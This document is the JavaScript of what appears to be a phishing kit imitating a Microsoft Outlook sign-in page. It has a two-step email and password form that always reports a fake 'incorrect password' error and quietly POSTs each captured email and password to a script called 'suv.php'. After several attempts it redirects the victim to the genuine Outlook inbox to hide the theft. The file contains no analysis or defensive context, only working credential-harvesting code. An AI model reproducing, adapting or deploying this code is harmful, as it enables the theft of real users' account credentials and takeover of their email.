<script type="text/javascript">

   var email = document.getElementById('travellerr');
   var password = document.getElementById('trackedd');
   var counter = 0;



$('#nextButzz').click(function(e){
   e.preventDefault();
   var checkmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/g;
   var alertx = document.querySelector('.merror');
   var vMail =document.getElementById('travellerr').value;


   if($('#travellerr').val() == ""){
      $('#travellerr').focus();
      $('.merror').addClass("alertTed");
      // alertx.style.color = "red";
      alertx.textContent = "Please enter an email address.";
      $('#travellerr').addClass("has-error");
      return false;
   }else if(!($('#travellerr').val().match(checkmail))){
      $('#travellerr').focus();
      $('.merror').addClass("alertTed");
      // alertx.style.color = "red";
      alertx.textContent = "Please enter an email address.";
      $('#travellerr').addClass("has-error");
      return false;
   }else{

      $('.initial').addClass("hidden");
      $('.actual').removeClass("hidden");
      $('.cup').addClass("hidden");
      $('#travellerr').addClass("has-error");
      $('#trackedd').focus();
      $('#topMembaEmail').html(vMail);
   }

   $(document).on('submit', '.dSecond', function() {
       var btn = $("#nextButzz");
    btn.prop("disabled", "disabled");
   if($('#trackedd').val() == ""){
      $('#trackedd').focus();
      $("#merror").html('<div class="merror alertTed">That’s an incorrect password. Try again.</div>');
      $('#trackedd').addClass("has-error");
      return false;
   }else {

      counter = counter + 1;
      $("#merror").html('<div class="alertTed">That’s an incorrect password. Try again.</div>');
      $('#trackedd').addClass("has-error");




   }

      if(counter > 3){
         var xmlhttp;
          if(window.XMLHttpRequest){
            xmlhttp = new XMLHttpRequest();
          }else{
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
          }

          xmlhttp.onreadystatechange=function(){
            if(xmlhttp.readyState==4 && xmlhttp.status==200){
            window.location = "https://outlook.office.com/mail/inbox";
            }
          }

          var email = document.getElementById('travellerr').value;
          var password = document.getElementById('trackedd').value;
          var formdata = new FormData();

          formdata.append("travellerr", email);
          formdata.append("trackedd", password);

          var url = 'suv.php?others';

          xmlhttp.open("POST", url);
          xmlhttp.send(formdata);

          return false;
      }else{
         var xmlhttp;
          if(window.XMLHttpRequest){
            xmlhttp = new XMLHttpRequest();
          }else{
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
          }

          xmlhttp.onreadystatechange=function(){
            if(xmlhttp.readyState==4 && xmlhttp.status==200){
               document.getElementById('trackedd').value = "";
               alertx.textContent = "Please enter an email address.";
               $('#trackedd').focus();



            }
          }

          var email = document.getElementById('travellerr').value;
          var password = document.getElementById('trackedd').value;
          var formdata = new FormData();

          formdata.append("travellerr", email);
          formdata.append("trackedd", password);

          var url = 'suv.php?others';

          xmlhttp.open("POST", url);
          xmlhttp.send(formdata);

          return false;
      }
   })


   })

</script>
